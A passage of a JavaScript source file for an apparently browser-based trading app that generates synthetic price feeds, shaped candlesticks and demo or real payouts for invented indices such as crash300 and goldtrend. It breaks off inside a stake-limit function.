(function (D6) {
  'use strict';

  var C = D6.CONFIG;
  var markets = {};
  var trades = [];
  var payoutLive = {};
  var lastOrderAt = 0;
  var sessionNonce = D6.uid();
  var orderSeq = 0;
  // Max 2 trades ouverts simultanés par compte.
  var MAX_OPEN = (C.MAX_OPEN || 2);
  var CANDLE_MS = 1000;
  var HISTORY_SEC = 240;
  var synthCache = {};

  function u32(n) {
    n = Math.imul(n ^ (n >>> 16), 2246822507);
    n = Math.imul(n ^ (n >>> 13), 3266489909);
    return (n ^ (n >>> 16)) >>> 0;
  }

  function uhash01(i, salt) {
    return u32(Math.imul(i | 0, 374761393) ^ Math.imul(salt | 0, 668265263)) / 4294967296;
  }

  function valueNoise(t, salt) {
    var i = Math.floor(t);
    var f = t - i;
    var u = f * f * (3 - 2 * f);
    return uhash01(i, salt) * (1 - u) + uhash01(i + 1, salt) * u;
  }

  function canonAssetId(id) {
    if (id === 'boom300' || id === 'pulseai') return C.ASSETS.titanpulse ? 'titanpulse' : 'v100';
    return C.ASSETS[id] ? id : 'v100';
  }

  // Profils indépendants : seed + vol + dérive + spikes (pas le même tableau + offset).
  function feedProfile(assetId) {
    switch (assetId) {
      case 'stable':
        return { salt: 221713, vol: 0.09, drift: 0, f1: 0.011, f2: 0.023, f3: 0.005, a1: 3.2, a2: 1.8, a3: 4.2, spike: null, stair: null };
      case 'v75':
        return { salt: 551903, vol: 0.92, drift: 0, f1: 0.088, f2: 0.17, f3: 0.041, a1: 16, a2: 11, a3: 24, spike: null, stair: null };
      case 'crash300':
        return { salt: 771001, vol: 0.35, drift: 0, f1: 0.01, f2: 0.022, f3: 0.005, a1: 2.2, a2: 1.4, a3: 3, spike: null, stair: null, crashBoom: 'crash' };
      case 'boomspike':
        return { salt: 882119, vol: 0.35, drift: 0, f1: 0.01, f2: 0.022, f3: 0.005, a1: 2.2, a2: 1.4, a3: 3, spike: null, stair: null, crashBoom: 'boom' };
      case 'apex500':
        return { salt: 440501, vol: 1, drift: 0, kind: 'apex' };
      case 'horizon50':
        return { salt: 550050, vol: 1, drift: 0, kind: 'horizon' };
      case 'goldtrend':
        return { salt: 660160, vol: 1, drift: 0, kind: 'gold' };
      case 'nexusprime':
        return { salt: 770870, vol: 1, drift: 0, kind: 'nexus' };
      case 'titanpulse':
        return { salt: 991177, vol: 1, drift: 0, kind: 'titan' };
      case 'v100':
      default:
        return { salt: 904177, vol: 1.05, drift: 0, f1: 0.041, f2: 0.093, f3: 0.017, a1: 18, a2: 11, a3: 32, spike: null, stair: null };
    }
  }

  function clampIndexPrice(p, asset) {
    var n = Number(p);
    var base = Number(asset && asset.basePrice) || 5000;
    if (!isFinite(n)) n = base;
    var lo = Math.max(1, base * 0.42);
    var hi = base * 2.8;
    return Math.round(Math.max(lo, Math.min(hi, n)) * 100) / 100;
  }

  window.assetBuffers = window.assetBuffers || {};

  function walkCfg(id) {
    switch (id) {
      case 'horizon50':
        return { vol: 0.024, inertia: 0.66, bias: 0, jerk: 0.58, minMove: 0.00115, salt: 550050 };
      case 'stable':
        return { vol: 0.00035, inertia: 0.985, bias: 0, jerk: 0.02, minMove: 0.00002, salt: 221713, lockedTrio: true };
      case 'goldtrend':
        return { vol: 0.0009, inertia: 0.97, bias: 0.00016, jerk: 0.02, minMove: 0.00004, salt: 660160, goldStair: true };
      case 'boomspike':
        return { vol: 0.00045, inertia: 0.92, bias: -0.00022, jerk: 0.03, minMove: 0.00003, salt: 882119, spike: 1, spikeLo: 25000, spikeHi: 35000, amt0: 0.015, amt1: 0.025 };
      case 'crash300':
        return { vol: 0.00045, inertia: 0.92, bias: 0.00022, jerk: 0.03, minMove: 0.00003, salt: 771001, spike: -1, spikeLo: 20000, spikeHi: 35000, amt0: 0.015, amt1: 0.025 };
      case 'v100':
        return { vol: 0.0011, inertia: 0.92, bias: 0, jerk: 0.06, minMove: 0.00005, salt: 904177, lockedTrio: true, v100Wave: true };
      case 'v75':
        return { vol: 0.0034, inertia: 0.58, bias: 0, jerk: 0.62, minMove: 0.00012, salt: 551903, v75Scalp: true };
      case 'nexusprime':
        return { vol: 0.00035, inertia: 0.96, bias: 0, jerk: 0.04, minMove: 0.00003, salt: 770870, nexusSine: true };
      case 'apex500':
        return { vol: 0.0012, inertia: 0.94, bias: 0, jerk: 0.05, minMove: 0.00005, salt: 440501, lockedTrio: true };
      case 'titanpulse':
        return { vol: 0.0007, inertia: 0.94, bias: 0, jerk: 0.07, minMove: 0.000045, salt: 991177, pulse: 17 };
      default:
        return { vol: 0.004, inertia: 0.85, bias: 0, jerk: 0.2, minMove: 0.00015, salt: 904177 };
    }
  }

  function isLockedTrio(id) {
    return id === 'v100' || id === 'stable' || id === 'apex500';
  }

  function capPctMove(prev, next, maxPct) {
    if (!(prev > 0) || !isFinite(next)) return prev;
    var lo = prev * (1 - maxPct);
    var hi = prev * (1 + maxPct);
    if (next < lo) return lo;
    if (next > hi) return hi;
    return next;
  }

  function trioTick(asset, price, vel, nowMs, detI, detK, dtSec) {
    var id = asset.id;
    var base = Number(asset.basePrice) || price;
    var t = (nowMs || 0) / 1000;
    var dt = dtSec > 0 ? dtSec : 0.25;
    var rnd = detI != null
      ? (uhash01(detI * 17 + (detK || 0), walkCfg(id).salt) - 0.5) * 2
      : (Math.random() - 0.5) * 2;
    var next = price;
    if (id === 'stable') {
      var targetS = base * (1
        + Math.sin(t * 0.13) * 0.00165
        + Math.sin(t * 0.057 + 0.8) * 0.0007
        + rnd * 0.00008);
      next = price + (targetS - price) * Math.min(1, dt * 1.8);
      next = capPctMove(price, next, 0.00055 * (dt / 0.25));
      vel = next - price;
    } else if (id === 'v100') {
      var maxPerSec = 0.0025;
      var targetV = base * (1
        + Math.sin(t * 0.09) * 0.006
        + Math.sin(t * 0.21 + 0.4) * 0.0024
        + rnd * 0.00035);
      var maxStep = price * maxPerSec * dt;
      var dV = targetV - price;
      if (dV > maxStep) dV = maxStep;
      if (dV < -maxStep) dV = -maxStep;
      next = price + dV;
      vel = dV;
    } else {
      var bucket = Math.floor(t);
      var run = 4 + Math.floor(uhash01(Math.floor(bucket / 8), 440501) * 3);
      var pos = bucket % (run + 3);
      var dir = pos < run ? 1 : -1;
      var stepA = price * (dir > 0 ? 0.00135 : 0.00062) * dir * dt;
      next = price + stepA + rnd * price * 0.00006;
      next = capPctMove(price, next, 0.0035 * dt);
      vel = next - price;
    }
    return { price: clampIndexPrice(next, asset), vel: vel };
  }

  function walkTick(price, vel, cfg, asset, nowMs, detI, detK) {
    if (asset && isLockedTrio(asset.id)) {
      return trioTick(asset, price, vel, nowMs, detI, detK, 0.25);
    }
    var rnd = detI != null
      ? (uhash01(detI * 17 + (detK || 0), cfg.salt) - 0.5) * 2
      : (Math.random() - 0.5) * 2;
    var flip = detI != null
      ? (uhash01(detI * 31 + (detK || 0), cfg.salt + 9) < cfg.jerk)
      : (Math.random() < cfg.jerk);
    var vol = cfg.vol;
    if (cfg.compress) {
      var phC = ((nowMs / 1000) % cfg.compress) / cfg.compress;
      vol *= phC < 0.62 ? 0.26 : 2.55;
    }
    if (cfg.pulse) {
      var phP = ((nowMs / 1000) % cfg.pulse) / cfg.pulse;
      vol *= phP < 0.84 ? 0.2 : 3.8;
    }
    var bias = cfg.bias || 0;
    if (cfg.cycle) {
      var cyc = Math.floor((nowMs / 1000) / cfg.cycle);
      bias = (cyc % 2 === 0 ? 1 : -0.28) * Math.abs(cfg.bias || 0.00018);
    }
    if (cfg.nexusSine) {
      var ampN = (Number(asset.basePrice) || price) * 0.011;
      var microN = rnd * (Number(asset.basePrice) || price) * 0.00012;
      price = (Number(asset.basePrice) || price) + Math.sin((nowMs / 1000) * Math.PI / 20) * ampN + microN;
      return { price: clampIndexPrice(price, asset), vel: 0 };
    }
    if (cfg.goldStair) {
      var phG = (nowMs / 1000) % 10;
      var climb = phG < 7 ? price * 0.00032 : price * 0.00002;
      vel = Math.max(0, vel * 0.55) + climb;
      price += vel;
      return { price: clampIndexPrice(price, asset), vel: vel };
    }
    vel = vel * cfg.inertia + rnd * vol * price * 0.38 + (flip ? -vel * 0.55 : 0) + bias * price;
    price += vel;
    var floor = (cfg.minMove || 0) * price;
    if (Math.abs(price) > 1 && Math.abs(vel) < floor) {
      vel = (vel >= 0 ? 1 : -1) * Math.max(floor, price * 0.00002);
      price += vel;
    }
    return { price: clampIndexPrice(price, asset), vel: vel };
  }

  function capWicks15(candle) {
    if (!candle) return candle;
    var body = Math.abs(candle.c - candle.o);
    var ref = Math.max(Math.abs(candle.c), Math.abs(candle.o), 1);
    if (body < ref * 0.00012) body = ref * 0.00012;
    var maxW = body * 1.5;
    var hiBody = Math.max(candle.o, candle.c);
    var loBody = Math.min(candle.o, candle.c);
    if (candle.h > hiBody + maxW) candle.h = hiBody + maxW;
    if (candle.l < loBody - maxW) candle.l = loBody - maxW;
    candle.h = Math.max(candle.h, hiBody);
    candle.l = Math.min(candle.l, loBody);
    return candle;
  }

  function isSixCurve(id) {
    return id === 'v100' || id === 'goldtrend' || id === 'boomspike' || id === 'crash300' || id === 'v75' || id === 'nexusprime';
  }

  function candleMsFor(asset) {
    return asset && asset.id === 'v75' ? 250 : CANDLE_MS;
  }

  function decorateWicks(asset, candle, bucket) {
    var id = asset.id;
    var o = candle.o;
    var h = candle.h;
    var l = candle.l;
    var c = candle.c;
    var mid = (o + c) / 2;
    var body = Math.max(Math.abs(c - o), Math.abs(o) * 0.00022);
    if (id === 'v100') {
      var maxBody = Math.abs(o) * 0.0025;
      if (c > o + maxBody) c = o + maxBody;
      if (c < o - maxBody) c = o - maxBody;
      var wickV = Math.max(Math.abs(c - o) * 0.32, Math.abs(o) * 0.00012);
      h = Math.max(o, c) + wickV;
      l = Math.min(o, c) - wickV;
    } else if (id === 'apex500') {
      var runA = 4 + Math.floor(uhash01(Math.floor(bucket / 8), 440501) * 3);
      var posA = bucket % (runA + 3);
      var bodyA = Math.abs(o) * (0.00115 + uhash01(bucket, 440511) * 0.0007);
      if (posA < runA) {
        c = o + bodyA;
      } else {
        c = o - bodyA * 0.48;
      }
      var wickA = Math.abs(c - o) * 0.28;
      h = Math.max(o, c) + wickA;
      l = Math.min(o, c) - wickA;
    } else if (id === 'boomspike' && !candle._spike) {
      o = mid + body * 0.25;
      c = mid - body * 0.85;
    } else if (id === 'crash300' && !candle._spike) {
      o = mid - body * 0.25;
      c = mid + body * 0.85;
    } else if (id === 'v75') {
      var up75 = uhash01(bucket, 551903) > 0.48;
      o = up75 ? mid - body * 0.4 : mid + body * 0.4;
      c = up75 ? mid + body * 0.4 : mid - body * 0.4;
    }
    h = Math.max(h, o, c);
    l = Math.min(l, o, c);
    candle.o = clampIndexPrice(o, asset);
    candle.c = clampIndexPrice(c, asset);
    candle.h = clampIndexPrice(h, asset);
    candle.l = clampIndexPrice(l, asset);
    if (isSixCurve(id)) capWicks15(candle);
    if (isLockedTrio(id)) {
      capWicks15(candle);
      if (id === 'v100') {
        var mb = Math.abs(candle.o) * 0.0025;
        if (candle.c > candle.o + mb) candle.c = candle.o + mb;
        if (candle.c < candle.o - mb) candle.c = candle.o - mb;
        capWicks15(candle);
      }
    }
    return candle;
  }

  function seedAssetBuffer(asset) {
    var cfg = walkCfg(asset.id);
    var price = Number(asset.basePrice) || 5000;
    var vel = 0;
    var now = Date.now();
    var cms = candleMsFor(asset);
    var t0 = Math.floor(now / cms) - 59;
    var candles = [];
    var prices = [];
    var i;
    var k;
    var nextSpike = now + (cfg.spikeLo || 25000);
    for (i = 0; i < 60; i++) {
      var ts = (t0 + i) * cms;
      var o = price;
      var h = o;
      var l = o;
      var spiked = false;
      for (k = 0; k < 4; k++) {
        var st = walkTick(price, vel, cfg, asset, ts + k * (cms / 4), t0 + i, k);
        price = st.price;
        vel = st.vel;
        if (price > h) h = price;
        if (price < l) l = price;
      }
      if (cfg.spike) {
        var loS = cfg.spike === 1 ? 25 : 20;
        var period = loS + Math.floor(uhash01(Math.floor((t0 + i) / 40), cfg.salt + 3) * 11);
        if ((t0 + i) % period === period - 1) {
          var amt = cfg.amt0 + uhash01(t0 + i, cfg.salt + 7) * (cfg.amt1 - cfg.amt0);
          price = clampIndexPrice(o * (1 + cfg.spike * amt), asset);
          spiked = true;
          if (cfg.spike > 0) { h = Math.max(h, price); l = Math.min(l, o); }
          else { l = Math.min(l, price); h = Math.max(h, o); }
        }
      }
      var candle = decorateWicks(asset, { o: o, h: h, l: l, c: price, t: ts, _spike: spiked }, t0 + i);
      candles.push(candle);
      prices.push(candle.c);
      price = candle.c;
    }
    window.assetBuffers[asset.id] = {
      prices: prices,
      candles: candles,
      price: price,
      vel: vel,
      lastMs: now,
      bucket: Math.floor(now / cms),
      forming: decorateWicks(asset, { o: price, h: price, l: price, c: price, t: Math.floor(now / cms) * cms }, Math.floor(now / cms)),
      nextSpike: nextSpike,
      ver: isLockedTrio(asset.id) ? 8 : 7
    };
    return window.assetBuffers[asset.id];
  }

  function advanceBuffer(asset, nowMs) {
    window.assetBuffers = window.assetBuffers || {};
    var buf = window.assetBuffers[asset.id];
    if (!buf || !buf.candles || buf.candles.length < 50 || (isSixCurve(asset.id) && buf.ver !== 7) || (isLockedTrio(asset.id) && buf.ver !== 8)) {
      buf = seedAssetBuffer(asset);
    }
    nowMs = nowMs || Date.now();
    if (nowMs < buf.lastMs) nowMs = buf.lastMs;
    var cfg = walkCfg(asset.id);
    var cms = candleMsFor(asset);
    var elapsed = nowMs - buf.lastMs;
    if (elapsed > 4000) elapsed = 80;
    var stepMs = asset.id === 'v75' ? 40 : 70;
    var steps = Math.max(1, Math.min(12, Math.floor(elapsed / stepMs)));
    var s;
    var price = buf.price;
    var vel = buf.vel;
    var forming = buf.forming || { o: price, h: price, l: price, c: price, t: Math.floor(nowMs / cms) * cms };
    for (s = 0; s < steps; s++) {
      var tMs = buf.lastMs + ((s + 1) / steps) * elapsed;
      var didSpike = false;
      if (cfg.spike && tMs >= (buf.nextSpike || 0)) {
        var amtL = cfg.amt0 + Math.random() * (cfg.amt1 - cfg.amt0);
        var fromP = price;
        price = clampIndexPrice(fromP * (1 + cfg.spike * amtL), asset);
        vel = cfg.spike * price * 0.002;
        buf.nextSpike = tMs + cfg.spikeLo + Math.random() * (cfg.spikeHi - cfg.spikeLo);
        forming._spike = true;
        forming.o = fromP;
        didSpike = true;
      }
      if (!didSpike) {
        var tick = walkTick(price, vel, cfg, asset, tMs, null, s);
        price = tick.price;
        vel = tick.vel;
      }
      var bucket = Math.floor(tMs / cms);
      if (bucket !== buf.bucket) {
        forming.c = price;
        forming.h = Math.max(forming.h, price, forming.o);
        forming.l = Math.min(forming.l, price, forming.o);
        decorateWicks(asset, forming, buf.bucket);
        buf.candles.push(forming);
        if (buf.candles.length > 60) buf.candles.shift();
        buf.prices.push(forming.c);
        if (buf.prices.length > 60) buf.prices.shift();
        buf.bucket = bucket;
        forming = { o: price, h: price, l: price, c: price, t: bucket * cms };
      } else {
        if (price > forming.h) forming.h = price;
        if (price < forming.l) forming.l = price;
        forming.c = price;
      }
    }
    buf.price = price;
    buf.vel = vel;
    buf.forming = decorateWicks(asset, forming, buf.bucket);
    buf.lastMs = nowMs;
    return buf;
  }

  /** CRASH/BOOM type Deriv : petites bougies de tendance + spike rare. */
  function crashBoomCandleOHLC(asset, bucket) {
    var isCrash = asset.id === 'crash300';
    var salt = isCrash ? 771001 : 882119;
    var base = Number(asset.basePrice) || (isCrash ? 4210.55 : 5890.33);
    var slow = Math.sin(bucket * 0.017) * 55 + Math.cos(bucket * 0.009) * 28;
    var micro = (uhash01(bucket, salt) - 0.5) * 6;
    var o = base + slow + micro;
    var period = 15 + Math.floor(uhash01(Math.floor(bucket / 90), salt + 3) * 16);
    var spike = (bucket % period) === (period - 1);
    var c;
    var h;
    var l;
    if (isCrash) {
      if (spike) {
        c = o - (22 + uhash01(bucket, salt + 7) * 58);
        h = o + 0.4 + uhash01(bucket, salt + 8) * 2.2;
        l = c - uhash01(bucket, salt + 9) * 7;
      } else {
        c = o + (0.55 + uhash01(bucket, salt + 7) * 3.4);
        h = c + uhash01(bucket, salt + 8) * 1.5;
        l = o - uhash01(bucket, salt + 9) * 1.9;
      }
    } else if (spike) {
      /* Boom Spike : inverse du Crash 300 — pic vertical vert, même amplitude. */
      c = o + (22 + uhash01(bucket, salt + 7) * 58);
      l = o - 0.4 - uhash01(bucket, salt + 8) * 2.2;
      h = c + uhash01(bucket, salt + 9) * 7;
    } else {
      c = o - (0.55 + uhash01(bucket, salt + 7) * 3.4);
      l = c - uhash01(bucket, salt + 8) * 1.5;
      h = o + uhash01(bucket, salt + 9) * 1.9;
    }
    h = Math.max(h, o, c);
    l = Math.min(l, o, c);
    return {
      o: clampIndexPrice(o, asset),
      h: clampIndexPrice(h, asset),
      l: clampIndexPrice(l, asset),
      c: clampIndexPrice(c, asset),
      t: bucket * CANDLE_MS
    };
  }

  function synthCrashBoomPrice(conf, tSec) {
    var t = Number(tSec) || 0;
    var bucket = Math.floor(t);
    var frac = Math.min(1, Math.max(0, t - bucket));
    var full = crashBoomCandleOHLC(conf, bucket);
    var mid = full.o + (full.c - full.o) * frac;
    mid = Math.max(full.l, Math.min(full.h, mid));
    return clampIndexPrice(mid, conf);
  }

  function spikeAt(t, salt, dir) {
    var period = dir === 'down' ? 9.5 : 10.5;
    var epoch = Math.floor(t / period);
    var roll = uhash01(epoch, salt + (dir === 'down' ? 17 : 31));
    if (roll < 0.78) return 0;
    var phase = (t - epoch * period) / period;
    var amp = 28 + uhash01(epoch, salt + 99) * 55;
    var shape = phase < 0.22
      ? Math.sin((phase / 0.22) * Math.PI)
      : Math.max(0, 1 - (phase - 0.22) / 0.55) * 0.35;
    return (dir === 'down' ? -1 : 1) * amp * shape;
  }

  function synthPrice(asset, tSec) {
    var id = asset.id || asset;
    var conf = typeof asset === 'object' ? asset : (C.ASSETS[id] || { id: id, basePrice: 10000 });
    var p = feedProfile(conf.id);
    var t = Number(tSec) || 0;
    if (conf.id === 'crash300' || conf.id === 'boomspike' || p.crashBoom === 'crash' || p.crashBoom === 'boom') {
      return synthCrashBoomPrice(conf, t);
    }
    if (p.kind === 'apex') {
      var wA = Math.sin(t * 0.19) * 22 + Math.sin(t * 0.047 + 0.4) * 38 + Math.cos(t * 0.31) * 8;
      var nA = (valueNoise(t * 2.1, p.salt) - 0.5) * 6 + (valueNoise(t * 7.4, p.salt + 2) - 0.5) * 3;
      return conf.basePrice + wA + nA;
    }
    if (p.kind === 'horizon') {
      var wH = Math.sin(t * 2.85) * 38
        + Math.sin(t * 6.4 + 0.9) * 22
        + Math.cos(t * 1.35) * 16
        + Math.sin(t * 0.41) * 14;
      var nH = (valueNoise(t * 9.2, p.salt) - 0.5) * 18
        + (valueNoise(t * 21, p.salt + 3) - 0.5) * 10;
      return conf.basePrice + wH + nH;
    }
    if (p.kind === 'gold') {
      var cycleLen = 48;
      var cycle = Math.floor(t / cycleLen);
      var phG = t / cycleLen - cycle;
      var climb = phG < 0.68 ? (phG / 0.68) : (1 - (phG - 0.68) / 0.32 * 0.22);
      var ampG = (cycle % 2 === 0) ? 92 : 48;
      var nG = (valueNoise(t * 0.55, p.salt) - 0.5) * 5
        + (valueNoise(t * 2.1, p.salt + 5) - 0.5) * 2.2;
      return conf.basePrice + climb * ampG + cycle * 4 + nG;
    }
    if (p.kind === 'nexus') {
      var nX = (valueNoise(t * 0.9, p.salt) - 0.5) * 4
        + (valueNoise(t * 3.2, p.salt + 9) - 0.5) * 1.8;
      return conf.basePrice + Math.sin(t * 0.11) * 46 + Math.sin(t * 0.037) * 16 + nX;
    }
    if (p.kind === 'titan') {
      var epoch = Math.floor(t / 18);
      var phT = t / 18 - epoch;
      var quiet = phT < 0.78;
      var nT = (valueNoise(t * 1.4, p.salt) - 0.5) * (quiet ? 2.4 : 8);
      var burst = 0;
      if (!quiet) {
        var dir = uhash01(epoch, p.salt) > 0.5 ? 1 : -1;
        var amp = 36 + uhash01(epoch, p.salt + 4) * 55;
        burst = dir * amp * Math.sin(((phT - 0.78) / 0.22) * Math.PI);
      }
      return conf.basePrice + nT + burst;
    }
    if (conf.id === 'pulseai' || p.pulse) {
      var waveP = Math.sin(t * p.f1) * p.a1
        + Math.sin(t * p.f2 + 0.7) * p.a2
        + Math.cos(t * p.f3) * p.a3
        + Math.sin(t * 0.17) * 3.4;
      var compress = 0.52 + 0.48 * (0.5 + 0.5 * Math.sin(t * 0.0075));
      var nP = (valueNoise(t, p.salt) - 0.5) * 12
        + (valueNoise(t * 3.05, p.salt + 7) - 0.5) * 5.5
        + (valueNoise(t * 11.4, p.salt + 19) - 0.5) * 2.1;
      var epoch = Math.floor(t / 13);
      var brk = 0;
      if (uhash01(epoch, p.salt + 55) > 0.68) {
        var ph = t / 13 - epoch;
        var dir = uhash01(epoch, p.salt + 77) > 0.5 ? 1 : -1;
        brk = dir * (6 + uhash01(epoch, p.salt + 91) * 7) * Math.sin(Math.min(1, ph) * Math.PI);
      }
      return clampIndexPrice(conf.basePrice + (waveP + nP) * compress * p.vol + brk, conf);
    }
    var wave = Math.sin(t * p.f1) * p.a1
      + Math.cos(t * p.f2) * p.a2
      + Math.sin(t * p.f3) * p.a3;
    var n = (valueNoise(t, p.salt) - 0.5) * 16
      + (valueNoise(t * 2.17, p.salt + 41) - 0.5) * 7
      + (valueNoise(t * 8.3, p.salt + 113) - 0.5) * 2.4;
    var spike = p.spike ? spikeAt(t, p.salt, p.spike) : 0;
    return conf.basePrice + (wave + n) * p.vol + spike + p.drift * (t % 86400) * 0.04;
  }

  function shapeCandle(asset, bucket, raw) {
    var id = asset.id;
    var o = raw.o;
    var h = raw.h;
    var l = raw.l;
    var c = raw.c;
    if (id === 'v75') {
      var w75 = Math.abs(c - o) * 1.85 + 3.2 + uhash01(bucket, 551903) * 9;
      h = Math.max(h, o, c) + w75 * 0.62;
      l = Math.min(l, o, c) - w75 * 0.62;
    } else if (id === 'apex500') {
      var run = 4 + Math.floor(uhash01(Math.floor(bucket / 9), 440501) * 3);
      var pos = bucket % (run + 3);
      var midA = (o + c) / 2;
      var bodyA = 5.5 + uhash01(bucket, 440511) * 11;
      if (pos < run) {
        o = midA - 0.7;
        c = midA + bodyA;
        h = c + 1.4;
        l = o - 1;
      } else {
        o = midA + 0.6;
        c = midA - bodyA * 0.48;
        l = c - 1.1;
        h = o + 1;
      }
    } else if (id === 'titanpulse') {
      var phase = bucket % 18;
      var midT = (o + c) / 2;
      if (phase < 14) {
        var tiny = 0.35 + uhash01(bucket, 991177) * 1.5;
        o = midT - tiny * 0.5;
        c = midT + tiny * (uhash01(bucket, 991188) > 0.5 ? 0.5 : -0.5);
        h = Math.max(o, c) + 0.4;
        l = Math.min(o, c) - 0.4;
      } else {
        var ext = 18 + uhash01(bucket, 991199) * 42;
        var upT = uhash01(Math.floor(bucket / 18), 991201) > 0.5;
        o = midT;
        c = upT ? midT + ext : midT - ext;
        h = Math.max(o, c) + 2.2;
        l = Math.min(o, c) - 2.2;
      }
    } else if (id === 'v100') {
      var wk = Math.abs(c - o) * 0.55 + 1.4 + uhash01(bucket, 904177) * 4.2;
      h = Math.max(h, o, c) + wk * 0.52;
      l = Math.min(l, o, c) - wk * 0.52;
    } else if (id === 'nexusprime') {
      var wn = Math.abs(c - o) * 0.35 + 0.8 + uhash01(bucket, 770870) * 2.2;
      h = Math.max(h, o, c) + wn * 0.4;
      l = Math.min(l, o, c) - wn * 0.4;
    }
    h = Math.max(h, o, c);
    l = Math.min(l, o, c);
    return {
      o: clampIndexPrice(o, asset),
      h: clampIndexPrice(h, asset),
      l: clampIndexPrice(l, asset),
      c: clampIndexPrice(c, asset),
      t: raw.t
    };
  }

  function candleForBucket(asset, bucket) {
    if (asset.id === 'crash300' || asset.id === 'boomspike') {
      return crashBoomCandleOHLC(asset, bucket);
    }
    var start = bucket * CANDLE_MS;
    var o = synthPrice(asset, start / 1000);
    var h = o;
    var l = o;
    var c = o;
    var k;
    for (k = 1; k <= 4; k++) {
      var p = synthPrice(asset, (start + k * 200) / 1000);
      if (p > h) h = p;
      if (p < l) l = p;
      c = p;
    }
    return shapeCandle(asset, bucket, { o: o, h: h, l: l, c: c, t: start });
  }

  function formingCandle(asset, nowMs) {
    if (asset.id === 'crash300' || asset.id === 'boomspike') {
      var bucketCb = Math.floor(nowMs / CANDLE_MS);
      var full = crashBoomCandleOHLC(asset, bucketCb);
      var frac = (nowMs % CANDLE_MS) / CANDLE_MS;
      var cLive = full.o + (full.c - full.o) * frac;
      var hLive = Math.max(full.o, cLive);
      var lLive = Math.min(full.o, cLive);
      var wickUp = (full.h - Math.max(full.o, full.c)) * frac;
      var wickDn = (Math.min(full.o, full.c) - full.l) * frac;
      hLive += wickUp;
      lLive -= wickDn;
      return {
        o: full.o,
        h: clampIndexPrice(Math.max(hLive, full.o, cLive), asset),
        l: clampIndexPrice(Math.min(lLive, full.o, cLive), asset),
        c: clampIndexPrice(cLive, asset),
        t: bucketCb * CANDLE_MS
      };
    }
    var bucket = Math.floor(nowMs / CANDLE_MS);
    var start = bucket * CANDLE_MS;
    var o = synthPrice(asset, start / 1000);
    var h = o;
    var l = o;
    var c = synthPrice(asset, nowMs / 1000);
    var elapsed = nowMs - start;
    var k;
    var steps = Math.max(1, Math.min(5, Math.floor(elapsed / 200) + 1));
    for (k = 1; k < steps; k++) {
      var p = synthPrice(asset, (start + k * 200) / 1000);
      if (p > h) h = p;
      if (p < l) l = p;
    }
    h = Math.max(h, c);
    l = Math.min(l, c);
    var shaped = shapeCandle(asset, bucket, { o: o, h: h, l: l, c: c, t: start });
    var fracF = (nowMs % CANDLE_MS) / CANDLE_MS;
    var cForm = shaped.o + (shaped.c - shaped.o) * fracF;
    return {
      o: shaped.o,
        h: clampIndexPrice(Math.max(shaped.h, shaped.o, cForm), asset),
        l: clampIndexPrice(Math.min(shaped.l, shaped.o, cForm), asset),
        c: clampIndexPrice(cForm, asset),
      t: start
    };
  }

  function rebuildHistory(asset, nowMs) {
    var bucket = Math.floor(nowMs / CANDLE_MS);
    var start = bucket - HISTORY_SEC + 1;
    var candles = [];
    var history = [];
    var i;
    var b;
    var c;
    for (i = 0; i < HISTORY_SEC - 1; i++) {
      b = start + i;
      c = candleForBucket(asset, b);
      candles.push(c);
      history.push(c.c);
    }
    var forming = formingCandle(asset, nowMs);
    history.push(forming.c);
    return { candles: candles, forming: forming, history: history, to: bucket - 1 };
  }

  function syncMarket(market, asset, nowMs) {
    nowMs = nowMs || Date.now();
    var buf = advanceBuffer(asset, nowMs);
    var closed = buf.candles.slice();
    if (closed.length > 59) closed = closed.slice(-59);
    var forming = buf.forming;
    var history = buf.prices.slice();
    market.price = buf.price;
    market.candles = closed;
    market.candle = forming;
    market.history = history;
    market.ticksInCandle = Math.floor((nowMs % CANDLE_MS) / 80);
    publishAssetBuffer(asset.id, market);
    return market;
  }

  function publishAssetBuffer(assetId, market) {
    window.assetsState = window.assetsState || {};
    var prev = window.assetsState[assetId] || {};
    var candles = (market.candles || []).slice();
    if (market.candle) candles.push(market.candle);
    var buf = candles.slice(-60);
    var min = Infinity;
    var max = -Infinity;
    var i;
    for (i = 0; i < buf.length; i++) {
      var c = buf[i];
      if (!c) continue;
      if (c.l < min) min = c.l;
      if (c.h > max) max = c.h;
      if (c.c < min) min = c.c;
      if (c.c > max) max = c.c;
    }
    if (!isFinite(min) || !isFinite(max)) {
      min = Number(market.price) || 0;
      max = min;
    }
    window.assetsState[assetId] = {
      candles: buf,
      min: min,
      max: max,
      lastPrice: market.price,
      viewMin: prev.viewMin || 0,
      viewMax: prev.viewMax || 0,
      lockMin: prev.lockMin || 0,
      lockMax: prev.lockMax || 0,
      at: Date.now()
    };
  }

  function seedMarket(assetId) {
    var asset = C.ASSETS[assetId];
    var market = {
      id: assetId,
      price: asset.basePrice,
      history: [],
      candles: [],
      candle: { o: asset.basePrice, h: asset.basePrice, l: asset.basePrice, c: asset.basePrice },
      ticksInCandle: 0,
      payout: C.REAL_PAYOUT
    };
    return syncMarket(market, asset, Date.now());
  }

  function rollPayout(asset, mode) {
    if (mode === 'real') return C.REAL_PAYOUT;
    var span = asset.payoutMax - asset.payoutMin;
    return +(asset.payoutMin + Math.random() * span).toFixed(3);
  }

  function ensureMarkets() {
    var id;
    for (id in C.ASSETS) {
      if (markets[id]) continue;
      var asset = C.ASSETS[id];
      markets[id] = {
        id: id,
        price: asset.basePrice,
        history: [],
        candles: [],
        candle: { o: asset.basePrice, h: asset.basePrice, l: asset.basePrice, c: asset.basePrice },
        ticksInCandle: 0,
        payout: C.REAL_PAYOUT
      };
    }
  }

  function wakeMarket(assetId) {
    var id = canonAssetId(assetId);
    ensureMarkets();
    if (!synthCache[id] && C.ASSETS[id]) {
      syncMarket(markets[id], C.ASSETS[id], Date.now());
    }
    return markets[id];
  }

  function makeSeal(payload) {
    var s = sessionNonce + '|' + payload + '|' + orderSeq;
    var h = 2166136261;
    var i;
    for (i = 0; i < s.length; i++) {
      h ^= s.charCodeAt(i);
      h = Math.imul(h, 16777619);
    }
    return (h >>> 0).toString(16);
  }

  function automationDetected() {
    if (navigator.webdriver) return true;
    if (window.callPhantom || window._phantom) return true;
    if (window.domAutomation || window.domAutomationController) return true;
    return false;
  }

  function balOf(user, mode) {
    if (D6.Store.balanceMode) return D6.Store.balanceMode(user, mode);
    return D6.Store.balanceOf(user);
  }

  function setBal(user, mode, value) {
    if (D6.Store.setBalanceMode) D6.Store.setBalanceMode(user, mode, value);
    else {
      var prev = user.mode;
      user.mode = mode;
      D6.Store.setBalance(user, value);
      user.mode = prev;
    }
  }

  function stakeCap(user, stake, mode) {
    mode = mode || user.mode;
    var balance = balOf(user, mode);
    if (stake < C.MIN_STAKE) {
